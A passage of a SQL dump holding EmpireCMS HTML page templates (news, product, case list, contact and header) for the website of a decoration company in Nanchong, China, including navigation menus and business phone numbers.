src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\"><script type=\\\'text/javascript\\\' src=\\\'/Tools/Advert_js.ashx?id=10\\\'></script>\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>[!--title--]</h2>\r\n                    <p>时间：[!--newstime--] 来源：本站 作者：管理员</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p style=\\\"text-indent:2em;\\\">\r\n	               [!--newstext--]\r\n                    </p>\r\n                </div>\r\n\r\n                <div class=\\\"sx\\\">\r\n                    <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">上一篇：[!--info.pre--]</div>\r\n                    <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">下一篇：[!--info.next--]</div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1587024770,'newstemp',1,'admin'),(159,3,'案例列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]4,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul>   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n        </div>        \r\n\r\n\r\n            <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        \r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d H:i:s',22,0,0,1587619408,'listtemp',1,'admin'),(78,1,'子栏目导航标签模板','| [!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]',0,0,'<dd><a href=\\\'[!--classurl--]\\\'>[!--classname--]</a></dd>',1,1,'Y-m-d H:i:s',0,0,0,1587017414,'bqtemp',1,'admin'),(140,1,'新闻内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>[!--title--]</h2>\r\n                    <p>时间：[!--newstime--] 来源：本站 作者：管理员</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p style=\\\"text-indent:2em;\\\">\r\n	               [!--newstext--]\r\n                    </p>\r\n                </div>\r\n\r\n                <div class=\\\"sx\\\">\r\n                    <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">上一篇：[!--info.pre--]</div>\r\n                    <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">下一篇：[!--info.next--]</div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1587100672,'newstemp',1,'admin'),(171,2,'产品内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n           [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_prodetail_txt\\\">\r\n                <img src=\\\"[!--titlepic--]\\\" alt=\\\"[!--title--]\\\" />\r\n                <div class=\\\"shuoming\\\">\r\n                    <span>[!--title--]</span><br/>\r\n                    <p>[!--smalltext--]</p>\r\n                    <i><font>咨询热线：</font>0817-3618388</i>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"ny_prodetail_txt2\\\">\r\n                <div class=\\\"ny_detailtxt_content\\\">\r\n                    <div class=\\\"ny_detailtxt_i\\\"><p></p></div>\r\n                    <p>\r\n                       [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d',0,0,0,1588931230,'newstemp',1,'admin'),(114,3,'通用单页','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\"><script type=\\\'text/javascript\\\' src=\\\'/Tools/Advert_js.ashx?id=11\\\'></script>\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>联系我们</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1587024751,'newstemp',1,'admin'),(145,1,'header','<div class=\\\"header\\\">\r\n    <div class=\\\"header_center\\\">\r\n        <h1 class=\\\"logo wow zoomIn\\\"><a href=\\\"/\\\"><img width=\\\"64px\\\" height=\\\"64px\\\" src=\\\"/images/logo.png\\\" title=\\\"南充市丽邦装饰工程有限公司\\\" alt=\\\"南充市丽邦装饰工程有限公司\\\" /><img class=\\\"logo_txt\\\" src=\\\"/images/logo_txt.png\\\" alt=\\\"\\\"></a></h1>\r\n        <div class=\\\"tel\\\">\r\n            <p>15196780978</p>\r\n            <span>0816-3618388</span>\r\n        </div>\r\n       \r\n<div class=\\\"mune\\\">\r\n            \r\n    </div>\r\n    </div>\r\n    <div class=\\\"nav_bg\\\">\r\n        <div class=\\\"nav\\\">\r\n            <ul>\r\n                <li class=\\\"nav_active\\\"><a href=\\\"/\\\">网站首页</a></li>\r\n                <li><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></li>\r\n                <li><a href=\\\"/gywm/gsjj/\\\">关于我们</a></li>\r\n                <li><a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a></li>\r\n                <li><a href=\\\"/gcal/zxal/\\\">最新案例</a></li>\r\n                <li><a href=\\\"/gcal/jdal/\\\">经典案例</a></li>\r\n                <li><a href=\\\"/gssl/ryzz/\\\">公司实力</a></li>\r\n                <li><a href=\\\"/lxwm/\\\">联系我们</a></li>\r\n            </ul>\r\n        </div>\r\n    </div>\r\n</div>',1,0,'页面头部',0,0,'',0,0,0,1587101162,'tempvar',1,'admin'),(161,1,'header','<div class=\\\"header\\\">\r\n    <div class=\\\"header_center\\\">\r\n        <h1 class=\\\"logo wow zoomIn\\\"><a href=\\\"/\\\"><img width=\\\"64px\\\" height=\\\"64px\\\" src=\\\"/images/logo.png\\\" title=\\\"南充市丽邦装饰工程有限公司\\\" alt=\\\"南充市丽邦装饰工程有限公司\\\" /><img class=\\\"logo_txt\\\" src=\\\"/images/logo_txt.png\\\" alt=\\\"\\\"></a></h1>\r\n        <div class=\\\"tel\\\">\r\n            <p>15196780978</p>\r\n            <p>18190610788</p>\r\n            <span>0817-3618388</span>\r\n        </div>\r\n       \r\n<div class=\\\"mune\\\">\r\n    <svg t=\\\"1570411005191\\\" class=\\\"icon\\\" viewBox=\\\"0 0 1024 1024\\\" version=\\\"1.1\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\" p-id=\\\"8542\\\" width=\\\"32\\\" height=\\\"32\\\"><path d=\\\"M905.848832 706.56c22.84544 0 41.744384 18.75968 41.744384 41.603072 0 23.6032-18.898944 42.364928-41.744384 42.364928L301.010944 790.528c-22.833152 0-41.728-18.75968-41.728-42.364928 0-22.843392 18.896896-41.603072 41.728-41.603072L905.848832 706.56zM139.56096 215.488512c29.927424 0 53.557248 24.406016 53.557248 53.54496 0 29.927424-23.631872 53.559296-53.557248 53.559296C110.422016 322.592768 86.016 298.960896 86.016 269.033472 86.016 239.894528 110.422016 215.488512 139.56096 215.488512L139.56096 215.488512zM301.010944 317.44c-22.833152 0-41.728-19.13856-41.728-41.984s18.896896-41.984 41.728-41.984l604.837888 0c22.84544 0 41.744384 19.13856 41.744384 41.984s-18.898944 41.984-41.744384 41.984L301.010944 317.44zM301.010944 569.344c-22.833152 0-41.728-19.140608-41.728-41.984s18.896896-41.984 41.728-41.984l604.837888 0c22.84544 0 41.744384 19.140608 41.744384 41.984s-18.898944 41.984-41.744384 41.984L301.010944 569.344zM139.56096 458.835968c29.927424 0 53.557248 23.63392 53.557248 53.557248 0 29.140992-23.631872 53.557248-53.557248 53.557248C110.422016 565.950464 86.016 541.534208 86.016 512.393216 86.016 482.46784 110.422016 458.835968 139.56096 458.835968L139.56096 458.835968zM139.56096 701.407232c29.927424 0 53.557248 24.420352 53.557248 53.559296 0 29.925376-23.631872 53.54496-53.557248 53.54496C110.422016 808.511488 86.016 784.893952 86.016 754.968576 86.016 725.827584 110.422016 701.407232 139.56096 701.407232L139.56096 701.407232z\\\" p-id=\\\"8543\\\" fill=\\\"#253f8e\\\"></path></svg>        \r\n    </div>\r\n    </div>\r\n    <div class=\\\"nav_bg\\\">\r\n        <div class=\\\"nav\\\">\r\n            <ul>\r\n                <li class=\\\"nav_active\\\"><a href=\\\"/\\\">网站首页</a></li>\r\n                <li><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></li>\r\n                <li><a href=\\\"/gywm/gsjj/\\\">关于我们</a></li>\r\n                <li><a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a></li>\r\n                <li><a href=\\\"/gcal/zxal/\\\">最新案例</a></li>\r\n                <li><a href=\\\"/gcal/jdal/\\\">经典案例</a></li>\r\n                <li><a href=\\\"/gssl/ryzz/\\\">公司实力</a></li>\r\n                <li><a href=\\\"/lxwm/\\\">联系我们</a></li>\r\n            </ul>\r\n        </div>\r\n    </div>\r\n</div>',1,0,'页面头部',0,0,'',0,0,0,1587628855,'tempvar',1,'admin'),(183,2,'产品内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n           [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_prodetail_txt\\\">\r\n                <img src=\\\"[!--titlepic--]\\\" alt=\\\"[!--title--]\\\" />\r\n                <div class=\\\"shuoming\\\">\r\n                    <span>[!--title--]</span><br/>\r\n                    <p>[!--smalltext--]</p>\r\n                    <i><font>咨询热线：</font>0817-3618388</i>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"ny_prodetail_txt2\\\">\r\n                <div class=\\\"ny_detailtxt_content\\\">\r\n                    <div class=\\\"ny_detailtxt_i\\\"><p></p></div>\r\n                    <p>\r\n                       [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            \r\n            <div class=\\\"sx\\\">\r\n                <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">\r\n                    上一篇：[!--info.pre--]</div>\r\n                <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">\r\n                    下一篇：[!--info.next--]</div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d',0,0,0,1589788664,'newstemp',1,'admin'),(182,1,'新闻内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link 